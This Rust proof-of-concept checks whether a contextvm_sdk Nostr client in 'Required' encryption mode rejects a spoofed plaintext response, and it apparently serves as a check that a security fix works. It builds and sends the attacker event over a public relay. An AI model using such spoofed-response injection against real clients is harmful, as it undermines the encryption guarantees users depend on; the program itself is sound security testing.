use contextvm_sdk::core::types::*;
use contextvm_sdk::transport::client::{NostrClientTransport, NostrClientTransportConfig};
use nostr_sdk::prelude::*;
use std::time::Duration;
use tokio::time::timeout;
use contextvm_sdk::core::constants::CTXVM_MESSAGES_KIND;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize tracing at WARN level so we can see the security rejection log from the fix
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::WARN)
        .init();

    // Using a fast public relay for the PoC
    let relay_url = "wss://relay.damus.io";

    let client_keys = Keys::generate();
    let server_keys = Keys::generate();

    println!("============================================================");
    println!("🛡️  INITIALIZING VICTIM (CLIENT)");
    println!("Mode: EncryptionMode::Required (Strictly NO plaintext)");
    println!("============================================================");
    let client_config = NostrClientTransportConfig {
        relay_urls: vec![relay_url.to_string()],
        server_pubkey: server_keys.public_key().to_hex(),
        encryption_mode: EncryptionMode::Required, // STRICT MODE
        is_stateless: false,
        timeout: Duration::from_secs(10),
    };

    let mut client_transport = NostrClientTransport::new(client_keys.clone(), client_config).await?;
    client_transport.start().await?;
    let mut client_rx = client_transport.take_message_receiver().unwrap();

    println!("😈 INITIALIZING ATTACKER (SPOOFED SERVER)");
    let attacker_client = Client::new(server_keys.clone());
    attacker_client.add_relay(relay_url).await?;
    attacker_client.connect().await;

    // Attacker subscribes to the Victim's requests
    let filter = Filter::new()
        .kind(Kind::Custom(CTXVM_MESSAGES_KIND))
        .pubkey(server_keys.public_key()) // Wait, client sends to server pubkey
        .custom_tag(SingleLetterTag::lowercase(Alphabet::P), server_keys.public_key().to_hex())
        .since(Timestamp::now());
    attacker_client.subscribe(filter, None).await?;

    // We don't even need to wait for the request, we can just spam a spoofed response directly!
    // The victim's event loop will process it because it bypasses the EncryptionMode check.

    println!("💣 Attacker crafts a 100% PLAINTEXT response (Violates Required Mode)...");
    let response_msg = JsonRpcMessage::Response(JsonRpcResponse {
        jsonrpc: "2.0".to_string(),
        id: serde_json::json!("poc-test-id"),
        result: serde_json::json!("ATTACK_SUCCESS: Plaintext Accepted!"),
    });

    // Manually build PLAINTEXT event
    let content = serde_json::to_string(&response_msg)?;
    let tags = vec![
        Tag::public_key(client_keys.public_key()),
    ];
    let event = EventBuilder::new(Kind::Custom(CTXVM_MESSAGES_KIND), content)
        .tags(tags)
        .sign_with_keys(&server_keys)?;
    
    println!("📤 Attacker floods the plaintext response back to the Victim...");
    attacker_client.send_event(&event).await?;
    
    println!("🔍 Victim is receiving the network response...");
    // If the vulnerability exists, the victim parses the plaintext and pushes it to client_rx
    let result = timeout(Duration::from_secs(3), client_rx.recv()).await;

    println!("\n============================================================");
    match result {
        Ok(Some(msg)) => {
            println!("🚨 VULNERABILITY CONFIRMED 🚨");
            println!("Victim allowed plaintext through despite EncryptionMode::Required!");
            println!("Parsed Message Data: {:?}", msg);
        }
        Ok(None) | Err(_) => {
            println!("✅ FIX IS WORKING ✅");
            println!("Victim safely dropped the plaintext message and strictly enforced Required mode!");
        }
    }
    println!("============================================================\n");

    Ok(())
}